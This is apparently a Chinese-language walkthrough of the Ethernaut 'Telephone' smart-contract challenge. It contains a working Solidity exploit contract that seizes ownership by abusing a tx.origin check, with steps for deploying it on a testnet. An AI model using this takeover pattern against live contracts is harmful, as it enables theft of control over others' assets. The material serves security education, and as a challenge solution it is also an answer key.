# level4 Telephone

## 1. 问题

将 `Telephone` 合约的 `owner` 设置为自己的地址。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```


## 2. 解法

合约中提供了 `changeOwner` 函数，只要该函数的调用方（`msg.sender`）和交易发起方（`tx.origin`）不一致，就可以成功修改 `owner`。我们可以通过部署一个 Bridge 合约，间接调用 `changeOwner` 函数来实现目标。

> [!TIP]
> `tx.origin` 指向的是**最初发起交易**的 EOA 地址，而 `msg.sender` 指向的是**直接调用本合约的上一个地址**。
> 对于嵌套调用的场景：`EOA(A) -> CONTRACT(B) -> CONTRACT(C)`，在合约 C 中的函数中，`tx.origin = A`，`msg.sender = B`。


1. 编写一个 Bridge 合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Bridge {
    Telephone public telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }
    
    function send() external {
        // 设置owner为EOA地址
        telephone.changeOwner(msg.sender);
    }
} 
```

2. 将上述代码复制到 Remix，部署到测试链：[交易链接](https://sepolia.etherscan.io/tx/0xf97be735216a1dddb144ff56dcf25b7de9f94af21c7e5f2ef987c7557d317f35)。


3. 在 Remix 中调用 `send` 接口：[交易链接](https://sepolia.etherscan.io/tx/0x77174fef6cca1ed5feb39a0ee7ea1ee836f4eca9612c029806adbe61872c6b0a)。


4. 在 Ethernaut 控制台查询 `owner`，确认地址已经变更：

```bash
await contract.owner()
```

5. 点击 `submit instance`， 提交通过！



<br/>
<br/>
| [⬅️ level3 Coin Flip](../level3_coinflip/README.md) | [level5 Token ➡️](../level5_token/README.md) |
|:------------------------------|--------------------------:|